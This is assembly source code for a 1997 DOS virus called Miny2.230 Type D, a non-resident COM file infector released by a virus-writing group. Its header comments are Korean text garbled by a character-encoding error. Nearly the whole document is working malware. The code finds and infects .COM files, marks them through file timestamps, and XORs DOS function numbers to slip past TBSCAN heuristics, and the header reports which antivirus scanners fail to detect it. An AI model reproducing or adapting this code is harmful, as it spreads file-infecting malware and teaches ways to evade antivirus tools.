   ;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
   ;
   ;                                                               CVC #02  97/09
   ; Virus Name : Miny2.230 Type D
   ; Author : Osiris
   ; Group : CVC
   ; Date : 1997/08/20
   ;
   ; Type : Non-resident COM infector
   ;
   ; Miny2 (Type C) ·* ˆ*¬åÌe·¡”a.
   ;
   ; TBSCAN ·* ·¥‰·»¡“w (Ò•~) µA ¸åÑa »¥”e·¡ ´e–E”a. ”e»¡ 62Á¡*¡  e—i‹¡ ˜*¢…µA 'T'
   ; Ïiœ*‹a e ¤w¬—Ðe”a. ‹a¶A Š‚**µA¬á  g·¡ ³a·¡“e ¤‚¯¥—iµA¬á“e ˆñ¬‚·¡ ¸åÑa´e–E”a.
   ; ”e, ·¥‰·»¡“wˆñ¬‚µA“e »¥”e·¡ –E”a. ·¡ˆå ”a·q ¤á¸åµA¬á Ð*‰iÐi µ*¸÷·¡”a.
   ;
   ; ·¡¤á¸åµA¬á“e TBSCAN µA¬á Howard *¡ »¥”e–A”å ¢…¹A¸ñ‰Á
   ; TBSCAN ·* ·¥‰·»¡“wµA ˆéŸ¡”å ¢…¹Aˆa Ð*‰i–A´ö”a.
   ;
   ; TBSCAN ·* F Ïiœ*‹a '·*¯±¯aœá¶… Ìa·© ´âA¯a' ¦*¦…·* ¢…¹A“e
   ; Ìa·© ‰Å*e ž*Ë¥—i·i XOR *¡ ´qÑ¡ÑÁ ¯¡Åa¬á ˜a*¡ Ñ¡Â‰Ða‰A  e—i´ö”a.
   ; µa‹¡¬á“e ˆb ‹¡“wµA 50h *¡ XOR µe¬e·i ¯¡Åa¬á Ñ¡Â‰Ð–”a.
   ;
   ; AVP 970812,DSAV 7.73,F-PROT 2.72a,PCSCAN 315,SCAN 9708,TBAV 8.02,V3 : »¥”e x
   ;
   ; µa¸åÓ¡ ¢…¹A¸ñ·¡œa¡e Ðeˆ*·* COM ˆqµq‰Á (ˆqµq¢•¡“aŸ±) EXE Ñw¯¢·* COM Ìa·©·i  e
   ; *v·i˜*·* ˆqµq¸÷»¡·¡”a. ¢‰*¥ ¯¡ˆe·i 62Á¡*¡  e—i£a*¡ ”a·qµA“e ‹a*· É·‰ÁÐe”a.
   ;
   ;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
               .MODEL  TINY
               .CODE

    Miny2:     nop                         ; ³a*A‹¡ˆt (´a¢*·©•¡ ´eÐe”a.)
               nop                         ; ´|¦*¦… ¥¢Š*¯¡ ¤a·¡œá¯aˆa ÌaŠA–A‹¡
               nop                         ; ˜*¢…µA ·¡ ˆt·i *ý´ö”a.
    start:
               call  Next                  ;
    Next:      pop   bp                    ;
               nop                         ; nop ·i ¨*¤áŸ¡¡e 'Howard' *¡ »¥”e
               sub   bp,offset Next        ; BP = ¤a·¡œá¯a ¯¡¸b»¡¸ñ

               lea   si,COM_head[BP]       ; COM ´|¦*¦… ¥¢Š*
               mov   di,0FFh               ; DI Ÿi 100h *¡ ¸s´a ¤áŸ¡¡e
               inc   di                    ;
               push  di                    ; TBSCAN µA¬á 'O' ¬wÈ*ˆa ¤i¬—Ðe”a.
               movsw                       ;
               movsb                       ;

               mov   cx,0080h              ; DTA *¡ ¬a¶wÐ* PSP ˆa ÌaŠA–A£a*¡
               mov   si,0080h              ; ¸q¯¡ ¸á¸wÐe”a.
               lea   di,End_Virus[BP]      ;
               repz  movsb                 ;

               mov   ah,(4Eh xor 50h)      ; Ìa·© Àx‹¡
               mov   cx,00100011B
               lea   dx,Match_COM[BP]
    Find:      call  Int21
               jnc   ChkInfected           ;
    Restart:
               lea   si,End_Virus[BP]      ; ¶¥œ* DTA ¥¢Š*
               mov   di,0080h
               mov   cx,0080h
               repz  movsb
               RET

    ChkInfected:                           ; ˆqµq µa¦*Ÿi ÑÂ·¥Ðe”a.
               mov   al,DS:[0096h]         ; 62 Á¡ ·¥»¡ ˆñ¬aÐe”a.
               and   al,1Fh
               cmp   al,1Fh
               jnz   Infect
               mov   ah,(4Fh xor 50h)      ; ”a·q Ìa·© Àx‹¡
               jmp   Find
    Infect:
               mov   ah,(43h XOR 50h)
               mov   al,01h                ; ·ª‹¡/³a‹¡ ¢¬÷·a*¡ ¤aŽ‘
               xor   cx,cx
               mov   dx,009Eh
               call  Int21
               jc    Restart               ; µAœá¯¡ Ìa·© ”h‹¡

               mov   ah,(3Dh xor 50h)
               mov   al,02h                ; Ìa·© µ¡Ïe
               call  Int21
               jc    Restart

               xchg  ax,bx                 ; Ìa·© Ð…—i ´è‹¡

               mov   al,00
               mov   ah,(57h XOR 50h)      ; Ìa·© ¸b¬÷ ¯¡ˆe ´è‹¡
               call  Int21
               push  cx                    ; ¸b¬÷ ¯¡ˆe ¸á¸w
               push  dx                    ;

               mov   ah,(3Fh XOR 50h)      ; ´|¦*¦… ·ª‹¡
               lea   dx,COM_Head[BP]       ; ¤áÌá º*¡
               mov   cx,0003               ; 3 ¤a·¡Ëa
               call  Int21
               cmp   byte ptr COM_Head[BP],'M' ; MZ ·¥ˆa ?
               jnz   lseek2
               cmp   byte ptr COM_Head[BP+1],'Z'
               jz    Error
    lseek2:
               mov   al,02                 ; Ìa·© *{·a*¡ ·¡•·
               call  lseek
               or    dx,dx                 ; 64 KB ·¡¬w·¥ˆa ?
               jnz   Error                 ; ”a·q ˆñ¬a˜* µ¡Ïe ¯¡Ç¡»¡ ´g‹¡¶áÐ*¬á

               sub   ax,3                  ; ¸ñÏaˆt ‰*¬e
               mov   word ptr JumpCode[BP+1],ax     ;

               mov   ah,(40h XOR 50h)      ; ¤a·¡œá¯a ³a‹¡
               mov   cx,offset End_virus - 3 - 2
               lea   dx,start[BP]
               call  int21

               mov   al,00                 ; Àá·q·a*¡ ·¡•·
               call  lseek

               mov   ah,(40h xor 50h)      ; ¸ñÏa Å¡—a ³a‹¡
               mov   cx,0003
               lea   dx,JumpCode[BP]
               call  int21

    Error:
               pop   dx                    ; Ìa·© ¸b¬÷ ¯¡ˆe ¥¢Š*
               pop   cx                    ;
               or    cx,+1Fh               ; 62 Á¡*¡  e—i‹¡
               mov   ah,(57h XOR 50h)
               mov   al,01h              ;
               call  Int21

    Close:
               mov   ah,(3Eh XOR 50h)      ; Ìa·© ”h‹¡
               call  Int21
               jmp   Restart

    lseek:                                 ;
               xor   cx,cx
               xor   dx,dx
               mov   ah,40h
               inc   ah
               inc   ah
               int   21h
               ret

    Int21:                                 ; XOR 50h µe¬eÒ*
               xor   ah,50h                ; ·¥ÈáœóËa 21h Ñ¡Â‰
               int   21h
               ret

    COM_head   db    0CDh,20h,90h          ; COM ´|¦*¦…
    Match_COM  db    '*.c?m',00            ; COM Ìa·© Àx‹¡
               db    'Miny2'               ; £¡“¡ 2
    JumpCode   db    0E9h
               db    ?,?
    End_Virus:
               END   Miny2
